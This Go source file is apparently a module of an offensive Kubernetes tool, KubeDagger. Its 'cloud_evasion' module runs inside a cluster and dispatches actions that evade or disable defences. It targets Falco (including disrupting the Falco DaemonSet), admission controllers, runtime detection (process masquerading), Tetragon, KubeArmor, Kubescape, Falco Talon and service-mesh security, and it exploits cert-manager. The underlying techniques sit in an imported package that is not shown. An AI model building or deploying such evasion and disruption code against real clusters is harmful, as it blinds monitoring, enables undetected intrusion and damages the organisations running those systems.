package modules

import (
	"context"
	"fmt"

	"github.com/yasindce1998/KubeDagger/pkg/cloudevasion"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
)

type CloudEvasion struct{}

func (m *CloudEvasion) Name() string      { return "cloud_evasion" }
func (m *CloudEvasion) Platform() []string { return []string{"linux", "windows", "darwin"} }

func (m *CloudEvasion) getClients() (kubernetes.Interface, dynamic.Interface, error) {
	config, err := rest.InClusterConfig()
	if err != nil {
		return nil, nil, fmt.Errorf("in-cluster config: %w", err)
	}
	client, err := kubernetes.NewForConfig(config)
	if err != nil {
		return nil, nil, fmt.Errorf("kube client: %w", err)
	}
	dynClient, err := dynamic.NewForConfig(config)
	if err != nil {
		return nil, nil, fmt.Errorf("dynamic client: %w", err)
	}
	return client, dynClient, nil
}

func (m *CloudEvasion) Execute(ctx context.Context, args map[string]string) (*Result, error) {
	action := args["action"]
	if action == "" {
		action = "detect"
	}

	switch action {
	case "detect":
		return m.detect(ctx)
	case "falco":
		return m.evadeFalco(ctx, args)
	case "admission":
		return m.evadeAdmission(ctx, args)
	case "runtime":
		return m.evadeRuntime(ctx, args)
	case "disrupt":
		return m.disrupt(ctx)
	case "tetragon":
		return m.evadeTetragon(ctx, args)
	case "kubearmor":
		return m.evadeKubeArmor(ctx, args)
	case "kubescape":
		return m.evadeKubescape(ctx, args)
	case "talon":
		return m.evadeFalcoTalon(ctx, args)
	case "mesh_security":
		return m.evadeServiceMesh(ctx, args)
	case "certmanager":
		return m.exploitCertManager(ctx, args)
	default:
		return &Result{Success: false, Error: fmt.Sprintf("unknown action: %s", action)}, nil
	}
}

func (m *CloudEvasion) detect(ctx context.Context) (*Result, error) {
	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	systems, err := cloudevasion.DetectSystems(ctx, client, dynClient)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{
		Success: true,
		Output:  cloudevasion.FormatSystems(systems),
	}, nil
}

func (m *CloudEvasion) evadeFalco(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "symlink"
	}

	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	result, err := cloudevasion.EvadeFalco(ctx, client, dynClient, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) evadeAdmission(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "enumerate"
	}

	client, _, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	result, err := cloudevasion.EvadeAdmissionControllers(ctx, client, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) evadeRuntime(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "process_masquerade"
	}

	client, _, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	result, err := cloudevasion.EvadeRuntimeDetection(ctx, client, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) disrupt(ctx context.Context) (*Result, error) {
	client, _, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	result, err := cloudevasion.DisruptFalcoDaemonSet(ctx, client)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) evadeTetragon(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "io_uring"
	}
	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	result, err := cloudevasion.EvadeTetragon(ctx, client, dynClient, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) evadeKubeArmor(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "policy_audit"
	}
	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	result, err := cloudevasion.EvadeKubeArmor(ctx, client, dynClient, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) evadeKubescape(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "scan_timing"
	}
	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	result, err := cloudevasion.EvadeKubescape(ctx, client, dynClient, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) evadeFalcoTalon(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "decoy"
	}
	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	result, err := cloudevasion.EvadeFalcoTalon(ctx, client, dynClient, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) evadeServiceMesh(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "host_network"
	}
	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	result, err := cloudevasion.EvadeServiceMesh(ctx, client, dynClient, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) exploitCertManager(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "enumerate"
	}
	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	result, err := cloudevasion.ExploitCertManager(ctx, client, dynClient, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	return &Result{Success: result.Success, Output: result.Output}, nil
}
